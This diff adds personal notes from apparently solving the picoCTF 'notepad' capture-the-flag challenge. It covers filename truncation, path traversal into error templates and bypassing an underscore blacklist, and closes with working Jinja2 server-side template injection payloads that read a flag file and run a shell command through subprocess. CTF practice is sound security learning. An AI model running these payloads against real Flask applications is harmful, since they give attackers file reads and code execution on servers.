@@ -1,0 +1,23 @@
+1)  So we were encoding everything so we could get our filename, we didn't need to do that. 
+        We could've just done 'A'*128 because our fname is just the first 128 characters!
+2) Using request.args.NAME HERE to pass in the blacklisted "_"
+3) Instead of using Popen we could've also used built-in python modules like this:
+4) Instead of playing directly with the url_fix() function we could've just searched it online,
+    clicked "SOURCE" button on documentation and it would've led us right to the code, no guessing
+    needed on what this function is doing anymore.
+5) Why doesn't SSTI work when visiting directly at /static/path.html?
+    - these are being STATICLY rendered not through flask's Jinja,
+    the reason they're dynamically rendered for errors is because they're being imported using
+    "{% include "errors/" + error + ".html" %}"
+
+    this is why in the N00bz file sharing portal CTF SSTI was possible because all files with .HTML
+    were being ".read()" and then "return"[ed] from the "view" function.
+
+
+p1=&p2=&p3=&p4=&p5=&p6=__import__
+{{request['__class__']['__mro__'][11]['__subclasses__']()[183]()['_module']['__builtins__']['open']('flag-c8f5526c-4122-4578-96de-d7dd27193798.txt').read()}}
+credits: https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF_redpwn/notepad.md
+
+My solution:
+..\templates\errors\LMAO{{ ()|attr(request.args.class)|attr(request.args.base)|attr(request.args.subclasses)()|attr(request.args.getitem)(273)('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt', shell=True, stdout=-1)|attr('communicate')()|attr(request.args.getitem)(0)|attr('decode')('utf-8') }}
+&class=__class__&base=__base__&subclasses=__subclasses__&getitem=__getitem__
